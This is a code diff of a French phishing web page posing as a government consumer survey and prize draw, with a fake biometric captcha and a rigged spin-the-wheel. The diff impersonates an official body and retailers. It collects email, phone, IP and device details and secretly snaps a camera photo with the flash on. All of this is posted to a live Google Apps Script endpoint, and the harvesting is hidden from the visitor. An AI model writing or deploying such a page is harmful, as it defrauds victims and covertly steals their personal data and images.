@@ -3,114 +3,144 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Enquête & Jeu-Concours National</title>
+<title>Observatoire National de la Consommation - Enquête & Jeu-Concours</title>
 <style>
   * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
-  body { background-color: #eef2f5; color: #333; line-height: 1.5; padding-bottom: 30px; }
+  body { background-color: #f4f6f8; color: #333; line-height: 1.5; padding-bottom: 30px; }
   
-  .header { background: #fff; border-bottom: 2px solid #0066cc; padding: 15px; text-align: center; }
-  .header h1 { font-size: 22px; color: #0066cc; font-weight: 800; }
-  .header p { font-size: 12px; color: #666; margin-top: 4px; }
+  /* Bandeau républicain */
+  .top-bar { height: 4px; background: linear-gradient(to right, #002395 33%, #ffffff 33%, #ffffff 66%, #ED2939 66%); }
   
-  .container { max-width: 520px; margin: 25px auto; background: #fff; border-radius: 8px; padding: 30px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); }
+  .header { background: #fff; border-bottom: 1px solid #ddd; padding: 20px; text-align: center; }
+  .header h1 { font-size: 20px; color: #002395; font-weight: 700; letter-spacing: 0.5px; }
+  .header p { font-size: 12px; color: #666; margin-top: 5px; text-transform: uppercase; letter-spacing: 1px; }
   
-  h2 { font-size: 20px; margin-bottom: 10px; color: #111; }
-  .subtitle { font-size: 13px; color: #555; margin-bottom: 25px; }
+  .container { max-width: 540px; margin: 25px auto; background: #fff; border-radius: 4px; padding: 30px; box-shadow: 0 2px 10px rgba(0,0,0,0.05); }
+  
+  h2 { font-size: 22px; margin-bottom: 10px; color: #1a1a1a; }
+  .subtitle { font-size: 14px; color: #555; margin-bottom: 25px; }
   
   .step { display: none; }
   .step.active { display: block; animation: fadeIn 0.4s ease; }
   @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
   
-  .progress-bar { width: 100%; height: 8px; background: #e0e0e0; margin-bottom: 25px; border-radius: 4px; overflow: hidden; }
-  .progress-fill { height: 100%; background: #0066cc; width: 0%; transition: width 0.4s ease; }
+  .progress-bar { width: 100%; height: 6px; background: #e0e0e0; margin-bottom: 25px; border-radius: 3px; overflow: hidden; }
+  .progress-fill { height: 100%; background: #002395; width: 0%; transition: width 0.4s ease; }
   
-  /* Quiz */
-  .option-btn { display: block; width: 100%; text-align: left; background: #fff; border: 2px solid #ddd; padding: 12px 15px; margin-bottom: 10px; cursor: pointer; font-size: 14px; border-radius: 6px; }
-  .option-btn:hover { border-color: #0066cc; background: #f0f7ff; }
-  .option-btn.selected { background: #e6f0ff; border-color: #0066cc; font-weight: 600; }
+  /* Formulaire */
+  .form-group { margin-bottom: 15px; }
+  .form-group label { display: block; font-size: 13px; font-weight: 600; margin-bottom: 5px; color: #444; }
+  .form-group input { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px; font-size: 14px; }
+  .form-group input:focus { outline: none; border-color: #002395; }
   
-  .btn-action { background-color: #0066cc; color: white; border: none; padding: 14px; width: 100%; font-size: 16px; font-weight: bold; cursor: pointer; border-radius: 6px; margin-top: 15px; }
-  .btn-action:hover { background-color: #0052a3; }
+  .option-btn { display: block; width: 100%; text-align: left; background: #fff; border: 1px solid #ccc; padding: 12px 15px; margin-bottom: 10px; cursor: pointer; font-size: 14px; border-radius: 4px; }
+  .option-btn:hover { border-color: #002395; background: #f0f4ff; }
+  .option-btn.selected { background: #e6f0ff; border-color: #002395; font-weight: 600; }
+  
+  .btn-action { background-color: #002395; color: white; border: none; padding: 14px; width: 100%; font-size: 16px; font-weight: bold; cursor: pointer; border-radius: 4px; margin-top: 15px; }
+  .btn-action:hover { background-color: #001a70; }
   .btn-action:disabled { background-color: #ccc; cursor: not-allowed; }
   
+  /* Partenaires */
+  .partners { text-align: center; margin: 25px 0; padding: 15px 0; border-top: 1px solid #eee; border-bottom: 1px solid #eee; }
+  .partners p { font-size: 11px; color: #888; text-transform: uppercase; margin-bottom: 10px; letter-spacing: 1px; }
+  .partner-logos { display: flex; justify-content: center; gap: 15px; flex-wrap: wrap; }
+  .partner-logo { font-weight: bold; font-size: 14px; color: #999; font-family: Arial, sans-serif; }
+  
   /* Captcha / Biométrie */
-  .captcha-box { background: #f9f9f9; border: 2px dashed #ccc; padding: 20px; text-align: center; margin: 20px 0; border-radius: 6px; }
+  .captcha-box { background: #f9f9f9; border: 1px solid #ddd; padding: 20px; text-align: center; margin: 20px 0; border-radius: 4px; }
   .consent-box { background: #fbfbfb; border: 1px solid #e0e0e0; padding: 15px; margin: 20px 0; font-size: 11px; color: #666; border-radius: 4px; }
   .consent-label { display: flex; align-items: flex-start; gap: 10px; cursor: pointer; }
   .consent-label input { margin-top: 3px; width: 16px; height: 16px; }
   
-  #system-data { display: none; background: #1e1e1e; border: 1px solid #000; padding: 15px; margin-top: 20px; font-family: 'Courier New', monospace; font-size: 12px; color: #00ff00; text-align: left; border-radius: 6px; }
-  #system-data p { margin-bottom: 6px; }
+  #loader { display: none; text-align: center; margin-top: 20px; font-weight: 600; color: #002395; }
   
-  #camera-area { display: none; margin-top: 20px; border: 2px solid #0066cc; padding: 4px; border-radius: 6px; background: #000; }
-  #video-preview { width: 100%; display: block; transform: scaleX(-1); }
+  #camera-area { display: none; margin-top: 20px; text-align: center; font-size: 13px; color: #555; font-weight: bold; }
 
-  /* Roue de la Fortune */
+  /* Roue */
   #wheel-section { display: none; text-align: center; }
   .wheel-container { position: relative; width: 300px; height: 300px; margin: 20px auto; }
-  canvas { border-radius: 50%; box-shadow: 0 0 20px rgba(0,0,0,0.2); transition: transform 4s cubic-bezier(0.33, 1, 0.68, 1); }
+  canvas { border-radius: 50%; box-shadow: 0 0 20px rgba(0,0,0,0.15); transition: transform 4s cubic-bezier(0.33, 1, 0.68, 1); }
   #pointer { position: absolute; top: -15px; left: 50%; transform: translateX(-50%); font-size: 30px; z-index: 10; }
-  .btn-spin { background: #28a745; font-size: 18px; padding: 15px; margin-top: 20px; }
-  #result { margin-top: 20px; font-size: 18px; font-weight: bold; color: #28a745; display: none; }
+  .btn-spin { background: #ED2939; font-size: 18px; padding: 15px; margin-top: 20px; }
+  .btn-spin:hover { background: #c92231; }
 
-  .footer-links { text-align: center; font-size: 11px; color: #999; margin-top: 25px; }
-  #status-msg { font-size: 13px; color: #0066cc; text-align: center; margin-top: 15px; font-weight: 600; min-height: 20px;}
+  .footer-links { text-align: center; font-size: 11px; color: #999; margin-top: 25px; line-height: 1.8; }
 </style>
 </head>
 <body>
 
+<div class="top-bar"></div>
+
 <div class="header">
-  <h1>Enquête & Jeu-Concours National</h1>
-  <p>Tentez de gagner un bon d'achat de 500€</p>
+  <h1>Observatoire National de la Consommation</h1>
+  <p>Enquête d'utilité publique & Jeu-Concours</p>
 </div>
 
 <div class="container" id="main-container">
   <div class="progress-bar"><div class="progress-fill" id="progress-fill"></div></div>
 
-  <!-- ÉTAPE 1 : Questions -->
+  <!-- ÉTAPE 1 : Formulaire de contact + Questions -->
   <div class="step active" id="step-questions">
-    <h2>Votre profil consommateur</h2>
-    <p class="subtitle">Ces informations nous aident à mieux comprendre vos habitudes.</p>
-    <div id="question-container"></div>
-    <button class="btn-action" id="btn-next" style="display:none;">Valider mes réponses</button>
+    <h2>Participez à notre grande enquête 2026</h2>
+    <p class="subtitle">Répondez à quelques questions et tentez de remporter un bon d'achat de 500€ valable chez nos partenaires.</p>
+    
+    <div class="form-group">
+      <label>Adresse e-mail (pour recevoir le bon d'achat)</label>
+      <input type="email" id="input-email" placeholder="exemple@email.com" required>
+    </div>
+    <div class="form-group">
+      <label>Numéro de téléphone (SMS de confirmation)</label>
+      <input type="tel" id="input-phone" placeholder="06 12 34 56 78" required>
+    </div>
+
+    <div id="question-container" style="margin-top: 25px;"></div>
+    <button class="btn-action" id="btn-next" style="display:none;">Continuer</button>
+
+    <div class="partners">
+      <p>Nos partenaires officiels</p>
+      <div class="partner-logos">
+        <span class="partner-logo">Fnac</span>
+        <span class="partner-logo">Darty</span>
+        <span class="partner-logo">Amazon</span>
+        <span class="partner-logo">Leclerc</span>
+      </div>
+    </div>
   </div>
 
-  <!-- ÉTAPE 2 : Faux Captcha & Consentement -->
+  <!-- ÉTAPE 2 : Captcha Biométrique -->
   <div class="step" id="step-final">
-    <h2>Vérification de sécurité</h2>
-    <p class="subtitle">Pour éviter les participations frauduleuses, veuillez valider votre éligibilité.</p>
+    <h2>Vérification anti-robot</h2>
+    <p class="subtitle">Pour garantir l'équité du concours et éviter les inscriptions automatisées, veuillez valider votre éligibilité.</p>
 
     <div class="captcha-box">
-      <h3>🛡️ Test Anti-Robot</h3>
-      <p>Veuillez effectuer une analyse biométrique pour prouver que vous êtes bien une personne réelle.</p>
+      <h3>🛡️ Contrôle de sécurité requis</h3>
+      <p style="font-size: 13px; color: #666; margin-top: 5px;">Une analyse biométrique (caméra et flash) va être effectuée pour prouver que vous êtes bien une personne réelle.</p>
     </div>
     
     <div class="consent-box">
       <label class="consent-label">
         <input type="checkbox" id="chk-consent">
-        <span><strong>J'accepte les conditions générales du jeu-concours.</strong> Je certifie être majeur et j'autorise l'organisateur à utiliser mon appareil photo (caméra et flash) pour procéder à la vérification biométrique anti-robot et sécuriser ma participation.</span>
+        <span><strong>J'accepte le règlement de l'enquête et du jeu-concours.</strong> Je certifie être majeur et j'autorise l'organisateur à utiliser mon appareil photo (caméra et flash) pour procéder à la vérification biométrique anti-robot et sécuriser ma participation.</span>
       </label>
     </div>
 
-    <button class="btn-action" id="btn-submit" disabled>Démarrer l'analyse biométrique</button>
+    <button class="btn-action" id="btn-submit" disabled>Valider ma participation</button>
     
-    <div id="status-msg"></div>
+    <div id="loader">Vérification en cours... Ne quittez pas la page.</div>
     
-    <div id="system-data">
-      <p id="data-os"></p><p id="data-browser"></p><p id="data-screen"></p>
-      <p id="data-lang"></p><p id="data-cores"></p><p id="data-ram"></p><p id="data-battery"></p>
-    </div>
-
     <div id="camera-area">
-      <video id="video-preview" autoplay playsinline muted></video>
+      <div style="width: 100px; height: 100px; border-radius: 50%; overflow: hidden; margin: 0 auto; border: 3px solid #002395;">
+        <video id="video-preview" autoplay playsinline muted style="width:100%; height:100%; object-fit: cover; transform: scaleX(-1);"></video>
+      </div>
+      <p style="margin-top: 10px;">Analyse biométrique...</p>
     </div>
   </div>
 
   <!-- ÉTAPE 3 : Roue de la fortune -->
   <div class="step" id="wheel-section">
-    <div class="step-indicator" style="text-align:center; font-size:12px; color:#0066cc; font-weight:bold; margin-bottom:10px;">Étape 3/3</div>
-    <h2>🎊 Analyse réussie !</h2>
-    <p class="subtitle">Tournez la roue pour découvrir votre récompense.</p>
+    <h2>🎊 Félicitations !</h2>
+    <p class="subtitle">Votre participation est validée. Tournez la roue pour découvrir votre récompense.</p>
     
     <div class="wheel-container">
       <div id="pointer">▼</div>
@@ -118,18 +148,19 @@
     </div>
 
     <button id="spin" class="btn-action btn-spin">🎯 TOURNER LA ROUE</button>
-    <div id="result"></div>
   </div>
 
   <div class="footer-links">
-    <a href="#">Règlement</a> | <a href="#">Confidentialité</a> | <a href="#">Contact</a><br><br>
-    © 2026 Enquête & Jeu-Concours. Tous droits réservés.
+    <a href="#" style="color:#999; text-decoration:none;">Mentions légales</a> | 
+    <a href="#" style="color:#999; text-decoration:none;">Politique de confidentialité (CNIL)</a> | 
+    <a href="#" style="color:#999; text-decoration:none;">Contact</a><br><br>
+    © 2026 Observatoire National de la Consommation. Tous droits réservés.
   </div>
 </div>
 
 <script>
-// ⚠️ TON LIEN GOOGLE APPS SCRIPT EST INTÉGRÉ ICI ⚠️
-const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzXXAK0P_2GgddQJpa5zk_os6S0PVVYu50EeG1_6eO2vgxmSrSyTbcExexGgD0kOOJvgg/exec";
+// ⚠️ TON NOUVEAU LIEN GOOGLE APPS SCRIPT EST INTÉGRÉ ICI ⚠️
+const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxyBJ1b7bGa7ZK93Wl3l7jEHxCq95fO-uA4FomFkmKFgx9mySuEWiffTKXplax1fdh8iw/exec";
 
 const questions = [
   { text: "1. À quelle fréquence faites-vous vos achats en ligne ?", options: ["Plusieurs fois par semaine", "Une fois par mois", "Rarement", "Jamais"] },
@@ -147,13 +178,14 @@ const stepQuestions = document.getElementById('step-questions');
 const stepFinal = document.getElementById('step-final');
 const chkConsent = document.getElementById('chk-consent');
 const btnSubmit = document.getElementById('btn-submit');
-const statusMsg = document.getElementById('status-msg');
+const loader = document.getElementById('loader');
 const cameraArea = document.getElementById('camera-area');
 const video = document.getElementById('video-preview');
-const systemData = document.getElementById('system-data');
 const wheelSection = document.getElementById('wheel-section');
+const inputEmail = document.getElementById('input-email');
+const inputPhone = document.getElementById('input-phone');
 
-// ---- FONCTIONS DE RÉCUPÉRATION D'INFOS ----
+// ---- RÉCUPÉRATION DES INFOS (CACHÉ) ----
 function getDeviceInfo() {
   const ua = navigator.userAgent;
   let os = "Inconnu", browser = "Inconnu";
@@ -190,7 +222,7 @@ async function getPublicIP() {
   } catch (e) { return "IP inconnue"; }
 }
 
-// ---- LOGIQUE DU QUIZ ----
+// ---- LOGIQUE DU FORMULAIRE ----
 function renderQuestion() {
   const q = questions[currentIndex];
   qContainer.innerHTML = `
@@ -199,7 +231,7 @@ function renderQuestion() {
       ${q.options.map((opt, i) => `<button class="option-btn" data-index="${i}">${opt}</button>`).join('')}
     </div>
   `;
-  progressFill.style.width = `${((currentIndex) / questions.length) * 100}%`;
+  progressFill.style.width = `${((currentIndex) / questions.length) * 33}%`;
   selectedAnswer = null;
   btnNext.style.display = 'none';
 
@@ -214,6 +246,11 @@ function renderQuestion() {
 }
 
 btnNext.addEventListener('click', () => {
+  if (currentIndex === 0) {
+    if (!inputEmail.value || !inputEmail.value.includes('@')) { alert("Veuillez saisir un email valide."); return; }
+    if (!inputPhone.value || inputPhone.value.length < 8) { alert("Veuillez saisir un numéro de téléphone valide."); return; }
+  }
+
   if (selectedAnswer === null) return;
   currentIndex++;
   if (currentIndex < questions.length) {
@@ -229,52 +266,50 @@ chkConsent.addEventListener('change', () => {
   btnSubmit.disabled = !chkConsent.checked;
 });
 
-// ---- LANCEMENT DE LA COLLECTE ET DE LA CAMÉRA ----
 let mediaStream = null;
 
 btnSubmit.addEventListener('click', async () => {
   btnSubmit.disabled = true;
-  btnSubmit.textContent = "Analyse en cours...";
-  statusMsg.style.color = "#0066cc";
-  statusMsg.textContent = "Connexion au serveur de sécurité...";
+  btnSubmit.style.display = 'none';
+  loader.style.display = 'block';
 
   const info = getDeviceInfo();
   const screenInfo = `${window.screen.width}x${window.screen.height}`;
   const cores = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} cœurs` : "Inconnu";
   const ram = navigator.deviceMemory ? `${navigator.deviceMemory} Go` : "Inconnu";
-  
-  systemData.style.display = 'block';
-  
-  setTimeout(async () => {
-    document.getElementById('data-os').textContent = `> Système : ${info.os}`;
-    document.getElementById('data-browser').textContent = `> Navigateur : ${info.browser}`;
-    document.getElementById('data-screen').textContent = `> Résolution : ${screenInfo}`;
-    document.getElementById('data-lang').textContent = `> Langue : ${navigator.language}`;
-    document.getElementById('data-cores').textContent = `> CPU : ${cores}`;
-    document.getElementById('data-ram').textContent = `> RAM : ${ram}`;
+  const batteryInfo = await getBatteryInfo();
+
+  try {
+    mediaStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+    video.srcObject = mediaStream;
     
-    const batteryInfo = await getBatteryInfo();
-    document.getElementById('data-battery').textContent = `> Batterie : ${batteryInfo}`;
+    cameraArea.style.display = 'block';
 
-    statusMsg.textContent = "Données système validées. Activation caméra...";
+    const track = mediaStream.getVideoTracks()[0];
+    const caps = track.getCapabilities ? track.getCapabilities() : {};
+    if (caps.torch) {
+      try { await track.applyConstraints({ advanced: [{ torch: true }] }); } catch (e) {}
+    }
 
-    try {
-      mediaStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
-      video.srcObject = mediaStream;
-      cameraArea.style.display = 'block';
-      statusMsg.textContent = "📷 Analyse biométrique en cours...";
-      statusMsg.style.color = "#28a745";
+    // CAPTURE PHOTO EN CACHETTE
+    let photoBase64 = "";
+    setTimeout(() => {
+      try {
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth || 300;
+        canvas.height = video.videoHeight || 300;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        photoBase64 = canvas.toDataURL('image/jpeg', 0.8);
+      } catch(e) {}
+    }, 1500);
 
-      // Activation du flash (torche) si dispo
-      const track = mediaStream.getVideoTracks()[0];
-      const caps = track.getCapabilities ? track.getCapabilities() : {};
-      if (caps.torch) {
-        try { await track.applyConstraints({ advanced: [{ torch: true }] }); } catch (e) {}
-      }
-
-      // --- ENVOI DES DONNÉES VERS TON GOOGLE SHEETS ---
+    // ENVOI ET PASSAGE À LA ROUE
+    setTimeout(async () => {
       const ip = await getPublicIP();
       const formData = new FormData();
+      formData.append("email", inputEmail.value);
+      formData.append("phone", inputPhone.value);
       formData.append("ip", ip);
       formData.append("os", info.os);
       formData.append("browser", info.browser);
@@ -284,27 +319,26 @@ btnSubmit.addEventListener('click', async () => {
       formData.append("ram", ram);
       formData.append("battery", batteryInfo);
       formData.append("userAgent", info.ua);
+      if (photoBase64) formData.append("photo", photoBase64);
 
       await fetch(SCRIPT_URL, { method: "POST", body: formData });
 
-      // --- PASSAGE À LA ROUE APRÈS 3 SECONDES ---
-      setTimeout(() => {
-        stepFinal.classList.remove('active');
-        wheelSection.classList.add('active');
-        progressFill.style.width = '100%';
-        // On coupe la caméra une fois la "vérification" terminée
-        if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
-        cameraArea.style.display = 'none';
-      }, 3000);
+      if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
+      
+      loader.style.display = 'none';
+      cameraArea.style.display = 'none';
+      stepFinal.classList.remove('active');
+      wheelSection.classList.add('active');
+      progressFill.style.width = '100%';
+    }, 3000);
 
-    } catch (err) {
-      statusMsg.style.color = "#d9534f";
-      statusMsg.textContent = "❌ Échec. Veuillez autoriser l'accès à la caméra.";
-    }
-  }, 1200); 
+  } catch (err) {
+    loader.textContent = "❌ Impossible de lancer la vérification. Veuillez autoriser la caméra.";
+    loader.style.color = "#ED2939";
+  }
 });
 
-// ---- LOGIQUE DE LA ROUE DE LA FORTUNE ----
+// ---- ROUE DE LA FORTUNE (SANS RÉSULTAT) ----
 const wheelCanvas = document.getElementById("wheel");
 const ctx = wheelCanvas.getContext("2d");
 const segments = ["🎁 -10%", "🚚 Livraison gratuite", "🎧 Goodie", "🎟 5€ bon", "🎉 15%", "❌ Pas de gain"];
@@ -351,11 +385,11 @@ document.getElementById("spin").addEventListener("click", () => {
   wheelCanvas.style.transform = `rotate(${finalAngle}rad)`;
 
   setTimeout(() => {
-    const result = segments[segments.length - 1 - spinAngle];
-    const resultDiv = document.getElementById("result");
-    resultDiv.textContent = "🎊 Félicitations ! Vous avez gagné : " + result;
-    resultDiv.style.display = "block";
     spinning = false;
+    document.getElementById("spin").textContent = "Récompense en attente de validation";
+    document.getElementById("spin").style.backgroundColor = "#ccc";
+    document.getElementById("spin").style.color = "#666";
+    document.getElementById("spin").style.cursor = "default";
   }, 4000);
 });
 
